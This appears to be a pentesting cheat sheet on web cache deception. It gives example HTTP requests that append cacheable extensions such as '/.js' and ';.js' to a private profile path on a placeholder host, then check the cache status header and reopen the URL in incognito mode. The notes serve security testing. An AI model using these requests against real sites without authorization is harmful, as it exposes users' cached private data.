# Web Cache Deception

## Introduction
Web Cache Deception is an attack in which an attacker deceives a caching proxy into improperly storing private information sent over the internet and gaining unauthorized access to that cached data

## Where to find
`-`

## How to exploit
* Normal Request (For example in the settings profile feature)
```
GET /profile/setting HTTP/1.1
Host: www.vuln.com
```
The response is
```
HTTP/2 200 OK 
Content-Type: text/html
Cf-Cache-Status: HIT 
...
```

1. Try to add cacheable extension (For example .js / .css / .jpg, etc.)
```
GET /profile/setting/.js HTTP/1.1
Host: www.vuln.com
```
The response is
```
HTTP/2 200 OK 
Content-Type: text/html
Cf-Cache-Status: HIT 
...
```
If the `Cf-Cache-Status` response the request with `HIT` not `MISS` or `Error`. And then try to open the url in incognito mode

1. Add `;` before the extension (For example `;.js` / `;.css` / `;.jpg`, etc.)
```
GET /profile/setting/;.js HTTP/1.1
Host: www.vuln.com
```
The response is
```
HTTP/2 200 OK 
Content-Type: text/html
Cf-Cache-Status: HIT 
...
```
If the `Cf-Cache-Status` response the request with `HIT` not `MISS` or `Error`. And then try to open the url in incognito mode

## References
* [@bxmbn](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)